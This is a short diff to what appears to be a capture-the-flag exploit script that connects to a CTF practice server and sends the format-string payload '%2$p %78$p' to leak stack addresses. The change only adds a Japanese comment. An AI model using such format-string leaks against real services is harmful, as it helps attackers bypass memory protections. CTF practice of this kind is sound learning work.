@@ -17,7 +17,7 @@ def unpack(s):
 # connect
 with remote('ctfq.u1tramarine.blue', 10023) as p:
     p.recvuntil(b'?\n')
-    p.send(b'%2$p %78$p\n')
+    p.send(b'%2$p %78$p\n') # <= 自動化したいいいいい
     addr = p.recvline()
     addrs = re.findall(r'0x\w+', str(addr))
 
